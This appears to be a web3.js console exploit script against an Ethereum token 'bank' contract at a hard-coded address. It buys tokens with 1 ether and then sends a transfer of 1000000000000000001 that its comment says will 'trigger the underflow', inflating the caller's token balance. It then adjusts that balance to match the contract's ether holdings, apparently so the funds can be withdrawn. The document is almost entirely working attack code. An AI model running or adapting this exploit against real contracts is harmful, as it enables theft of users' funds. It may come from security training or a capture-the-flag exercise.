// Prepare the contract ABI
var bankAbi = [{"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"buy","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"user","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
var MyBank = web3.eth.contract(bankAbi);
var MyBankInstance = MyBank.at('0x38B30b220F0277a179958401CFD638708AA321f2');

// Buy 1 ether worth of tokens
MyBankInstance.buy({from: eth.accounts[0], value:web3.toWei(1, 'ether')})

// transfer 1000000000000000001 to trigger the underflow
MyBankInstance.transfer(0, 1000000000000000001, {from: eth.accounts[0]})

var balance_eth = eth.getBalance(MyBankInstance.address)
var balance_token = MyBankInstance.getBalance(eth.accounts[0])

// Note: Due to the internal representation of large number as bignumber
// we use balance_token.sub instead of balance_token - , to keep
// the bignumber representation
MyBankInstance.transfer(0, balance_token.sub(balance_eth), {from: eth.accounts[0]})


